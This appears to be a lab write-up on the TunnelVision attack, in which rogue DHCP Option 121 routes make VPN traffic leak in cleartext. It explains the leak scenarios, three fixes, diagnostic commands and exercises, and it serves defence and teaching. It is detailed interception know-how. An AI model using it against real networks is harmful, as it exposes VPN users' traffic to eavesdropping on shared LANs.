Probing target hosts 203.0.113.10 and 198.51.100.7 confirms that lookups resolve via vpn0 with source IP 10.13.37.2. The raw sniffer on v-vpn captures both UDP discard datagrams (VPN tunnel saw...), confirming zero leakage onto the physical network interface.


Section 2: Targeted Route Injection (Single /24 Subnet)
In Scenario 2, the client takes a new lease (exactly what happens at renewal time; a short lease time makes it frequent) from a rogue server sending Option 121 containing a targeted /24 route (203.0.113.0/24@192.168.50.1) and a default route (0.0.0.0/0@192.168.50.1). Because Option 121 is present, the client ignores Option 3 in accordance with RFC 3442.
When probing 203.0.113.10, the injected /24 is longer than the VPN’s 128.0.0.0/1, which also covers that address. The kernel routes traffic to 203.0.113.10 out of eth0 via 192.168.50.1. The sniffer on lan0 logs LAN (attacker) saw 192.168.50.10 -> 203.0.113.10: session=8f3a: the payload in cleartext, with the client’s LAN address as source. This is the targeted form: only one destination leaks, so nothing looks wrong to the user. Conversely, probes to 198.51.100.7 still fall back to 128.0.0.0/1 and pass through vpn0.


Section 3: Full Internet Traffic Interception via Four /2 Routes
In Scenario 3, the rogue DHCP server advertises four /2 routes covering the entire IPv4 address space (0.0.0.0/2, 64.0.0.0/2, 128.0.0.0/2, 192.0.0.0/2). Because prefix length 2 is greater than prefix length 1, all four injected routes override both /1 tunnel routes.
The routing dump displays all four /2 entries installed with proto dhcp metric 1024. Probing both 203.0.113.10 and 198.51.100.7 shows that all outbound traffic bypasses the VPN tunnel and egresses via eth0. The LAN sniffer logs unencrypted traffic for both destination IP addresses.


Section 4: wg-quick Policy Routing Exposure
Scenario 4 removes the /1 routes and installs wg-quick’s policy routing instead. It takes no new lease: the four rogue /2 routes from Scenario 3 are still in main. The two rules, as ip rule show prints them:
32764:  from all lookup main suppress_prefixlength 0
32765:  not from all fwmark 0xca6c lookup 51820
When Option 121 installs the four /2 routes into table main, rule 32764 matches because the /2 routes have prefix length 2, which exceeds 0. The suppress_prefixlength 0 directive only suppresses the /0 default route. Consequently, rule 32765 is never evaluated for normal traffic, and all application traffic egresses via eth0 in cleartext.


Section 5: Fix A, no suppress_prefixlength rule
In Scenario 5, rule 32764 (suppress_prefixlength 0) is removed. All unmarked traffic evaluates rule 32765 directly, which forces lookups into table 51820 (the VPN table).
Probes to 203.0.113.10 and 198.51.100.7 successfully traverse vpn0. However, Fix A introduces a side effect regarding local network access: 1. Tunnel packets originating from the local VPN process carry mark 0xca6c (51820), skipping rule 32765 and looking up table main to reach the VPN server IP (192.0.2.1). 2. Unmarked traffic destined for a legitimate local network resource (such as a LAN printer at 192.168.50.20) matches rule 32765 and is forcibly routed into table 51820. If the remote VPN does not route the local subnet, access to local resources fails. 3. Furthermore, because tunnel packets carrying mark 0xca6c evaluate table main, an attacker injecting specific routes for the VPN server’s remote IP address can still redirect or blackhole the encrypted tunnel traffic itself (resulting in a denial-of-service), though they cannot decrypt payload contents.


Section 6: Fix B, the client ignores Option 121
Scenario 6 restores standard wg-quick FIB rules but executes the DHCP client with --ignore-121. The client processes Option 3 and installs only a single default route (0.0.0.0/0) in table main.
Rule 32764 (suppress_prefixlength 0) matches the /0 route in main and suppresses it. Evaluation proceeds to rule 32765, which routes all application traffic safely into table 51820 and out vpn0.


Section 7: Fix C, namespace isolation
In Scenario 7, the physical interface eth0 is moved into a dedicated network namespace named phys. The application namespace client retains only vpn0 and loopback.
The physical routing table inside phys receives the four rogue /2 routes via DHCP, but these entries exist strictly within the phys namespace kernel state. The client routing table contains only the default route pointing to vpn0. All application traffic is structurally restricted to vpn0. In the lab vpn0 is a veth to the vpn namespace; with real WireGuard the encrypted UDP socket stays in phys, so the rogue routes can at most redirect or drop ciphertext.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Checking a real host
On a laptop or VPN client, three commands show whether DHCP has put routes where the tunnel cannot win:

Inspect active IPv4 routing tables for unexpected static routes installed by DHCP:
ip route show proto dhcp
Check whether specific destination lookups select the virtual tunnel interface or the physical adapter:
ip route get 203.0.113.10
ip route get 1.1.1.1
Inspect system policy routing rules to ensure no suppress_prefixlength bypasses exist without proper namespace isolation:
ip rule show

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Gotchas

RFC 3442 Mandatory Precedence Over Option 3: Compliant DHCP clients MUST ignore Option 3 (Router) completely if Option 121 is present in the server payload. Server configurations that supply Option 121 without an embedded 0.0.0.0/0 route will leave non-VPN clients without any default gateway.
Interface Metric Ineffectiveness against Prefix Length: Setting a high metric (such as metric 1024) on DHCP-injected Option 121 routes does not prevent them from taking precedence over VPN routes. Metrics are only evaluated when comparing routes with identical prefix lengths. A /2 route with metric 1024 will always beat a /1 or /0 route with metric 0.
Kill Switch Blind Spots: VPN kill switches that monitor virtual adapter operational state (operstate), tunnel socket status, or daemon process state will not trigger during a TunnelVision attack. The control plane remains connected and healthy while the data plane leaks via injected host routes in the primary namespace table.
Firewall Mitigation Limitations: Blocking non-VPN traffic on the physical interface prevents cleartext data exposure, but allows an attacker to perform traffic analysis. By selectively advertising specific subnet routes via Option 121 and observing which client connections fail, an attacker can determine destination services accessed by the user.
Policy Routing suppress_prefixlength Edge Cases: The wg-quick rule suppress_prefixlength 0 strictly suppresses matches against prefix length 0. It does not suppress /1, /2, or finer subnets installed by local software or DHCP options in the main table.
IPv6 has the same shape: a rogue Router Advertisement can carry RFC 4191 Route Information Options. Linux only installs RIOs up to accept_ra_rt_info_max_plen (functional default 0, so only ::/0). Raising it on a laptop that uses a full-tunnel VPN reopens the leak for IPv6.
Local LAN Access vs. Security Tradeoffs: Completely suppressing main table lookups for unmarked traffic prevents Option 121 leaks, but breaks local network resource discovery (e.g., local printers, NAS devices) unless explicit bypass rules are added to table 51820.
Option 249 is the same attack: clients that still honour Microsoft’s private Option 249 (ms_classless_static_routes in dhcpcd) must ignore it too, or the attacker simply switches option numbers.
Ignoring 121 must be unconditional: if the user can turn route acceptance back on when “the network does not work”, the attacker only has to break connectivity until they do (Leviathan makes the same point).
The lab’s VPN device is a veth: real WireGuard or OpenVPN changes nothing about the route lookup, but it does add the encapsulation path. Re-run the scenarios on a lab host with wg-quick before trusting a specific client.

title: DHCP Option 121 and VPN Route Leaks (TunnelVision)
text:
Exercises

Modify server.py to encode eight /3 static routes instead of four /2 routes. Calculate the wire byte size of the Option 121 payload and verify using lab.sh that kernel longest-prefix matching still routes cleartext traffic out eth0.
On a lab host with nftables, add a client policy that drops all outgoing packets on eth0 whose destination is not the explicit VPN server IP (192.0.2.1). Test Scenario 3 and confirm that data leaks are prevented while observing the resulting denial-of-service behavior.
Write a small checker that reads /proc/sys/net/ipv6/conf/*/accept_ra_rt_info_max_plen and accept_ra for every interface and warns when an interface accepts RAs with Route Information longer than /0. Run it on your laptop.
Update lab.sh to test a split-tunnel VPN configuration where only 203.0.113.0/24 is intended to pass through vpn0. Inject a rogue /25 route (203.0.113.0/25) via Option 121 and verify how partial traffic redirection occurs.
Build an automated shell script using ip netns that establishes a WireGuard interface in an isolated physical namespace (phys), moves the device node into the default namespace, and executes a full-tunnel lease cycle while verifying zero route pollution in the application environment.
